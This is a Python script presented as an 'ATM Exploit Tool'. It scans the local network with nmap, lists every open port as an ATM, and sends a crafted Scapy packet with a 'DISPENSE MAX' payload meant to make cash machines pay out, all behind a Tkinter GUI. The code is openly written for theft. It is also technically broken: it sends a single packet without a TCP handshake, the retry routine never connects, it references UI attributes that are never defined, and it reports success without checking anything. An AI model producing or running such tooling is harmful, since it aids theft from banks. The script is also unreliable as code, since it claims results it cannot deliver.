import os
import re
import logging
import time
from scapy.all import *
from tkinter import Tk, Button, Listbox, Label, messagebox, ttk
import netifaces
from concurrent.futures import ThreadPoolExecutor

# Setting up logging
logging.basicConfig(filename="atm_exploit.log", level=logging.DEBUG)

class ATMExploitTool:
    def __init__(self):
        self.atms = []  # List of detected ATMs
        self.selected_atm = None

    def get_local_network_range(self):
        """Automatically detect the local network range."""
        iface = netifaces.gateways()['default'][netifaces.AF_INET][1]
        local_ip = netifaces.ifaddresses(iface)[netifaces.AF_INET][0]['addr']
        network = '.'.join(local_ip.split('.')[:-1]) + '.0/24'
        return network

    def scan_for_atms(self, network):
        """Scan for ATMs on the network using Nmap."""
        print(f"Scanning network {network} for ATMs...")
        nmap_output_file = "nmap_results.txt"
       
        # Run Nmap and save results to a file
        os.system(f"nmap -p- -sV --open -oN {nmap_output_file} {network}")
        print("Scan complete. Parsing results...")

        # Parse the Nmap output to extract IPs and ports of potential ATMs
        self.atms = self.parse_nmap_results(nmap_output_file)
        if self.atms:
            print(f"Found ATMs: {self.atms}")
        else:
            print("No ATMs found.")
        return self.atms

    def parse_nmap_results(self, filename):
        """Extract IPs and open ports from Nmap results."""
        atms = []
        with open(filename, "r") as file:
            lines = file.readlines()

        current_ip = None
        for line in lines:
            ip_match = re.match(r"Nmap scan report for (.+)", line)
            if ip_match:
                current_ip = ip_match.group(1)
            elif current_ip and re.search(r"open", line):
                port_match = re.match(r"(\d+)/tcp\s+open\s+(.+)", line)
                if port_match:
                    port = int(port_match.group(1))
                    service = port_match.group(2)
                    atms.append({"ip": current_ip, "port": port, "service": service})
        return atms

    def exploit_atm(self, atm):
        """Exploit a detected ATM using Scapy."""
        print(f"Exploiting ATM at {atm['ip']} on port {atm['port']}...")

        try:
            # Create a custom crafted packet to exploit the ATM
            payload = f"DISPENSE MAX\n".encode()
            packet = IP(dst=atm["ip"]) / TCP(dport=atm["port"], flags="PA") / payload

            print(f"Sending payload: {payload}")
            send(packet, verbose=False)

            # Simulate response handling (this would depend on the ATM protocol)
            print("Payload sent successfully. ATM should dispense cash if vulnerable.")
            return True

        except Exception as e:
            logging.error(f"Error exploiting ATM at {atm['ip']}:{atm['port']}: {e}")
            return False

    def update_ui_progress(self, message):
        """Update the UI with real-time progress feedback."""
        self.progress_label.config(text=message)
        self.root.update_idletasks()

    def log_error(self, message):
        """Log errors to a file for debugging."""
        logging.error(message)

    def connect_with_retry(self, atm, retries=3, delay=5):
        """Attempt to connect to the ATM with retries."""
        for attempt in range(retries):
            try:
                # Attempt connection (e.g., Scapy or socket connection)
                return True
            except Exception as e:
                logging.error(f"Error connecting to ATM at {atm['ip']}:{atm['port']}: {e}")
                time.sleep(delay)
        return False

    def continuous_scan(self, network, interval=10):
        """Continuously scan for new ATMs every 'interval' seconds."""
        while True:
            self.scan_for_atms(network)
            time.sleep(interval)


class ATMExploitGUI:
    def __init__(self, controller):
        self.controller = controller
        self.root = Tk()
        self.root.title("ATM Exploit Tool")

        # UI Elements
        Label(self.root, text="Detected ATMs:").pack()
        self.atm_list = Listbox(self.root)
        self.atm_list.pack()

        Button(self.root, text="Scan for ATMs", command=self.scan_atms).pack()
        Button(self.root, text="Exploit Selected ATM", command=self.exploit_selected_atm).pack()

        self.progress_label = Label(self.root, text="Status: Waiting for action...")
        self.progress_label.pack()

        self.progress_bar = ttk.Progressbar(self.root, orient="horizontal", length=200, mode="indeterminate")
        self.progress_bar.pack()

    def scan_atms(self):
        """Scan the network for ATMs and populate the list."""
        self.atm_list.delete(0, "end")
        network = self.controller.get_local_network_range()
        self.controller.update_ui_progress("Scanning for ATMs...")
        atms = self.controller.scan_for_atms(network)
        for atm in atms:
            self.atm_list.insert("end", f"{atm['ip']}:{atm['port']} ({atm['service']})")

    def exploit_selected_atm(self):
        """Exploit the selected ATM."""
        selection = self.atm_list.curselection()
        if not selection:
            messagebox.showwarning("Warning", "No ATM selected.")
            return

        atm_index = selection[0]
        atm = self.controller.atms[atm_index]
       
        self.controller.update_ui_progress(f"Exploiting ATM at {atm['ip']}...")
        if self.controller.exploit_atm(atm):
            messagebox.showinfo("Success", "ATM exploited successfully! Cash should dispense.")
        else:
            messagebox.showerror("Error", "Failed to exploit ATM.")
        self.controller.update_ui_progress("Status: Waiting for action...")

    def run(self):
        self.root.mainloop()


# Main Function
if __name__ == "__main__":
    controller = ATMExploitTool()
    gui = ATMExploitGUI(controller)
    gui.run()
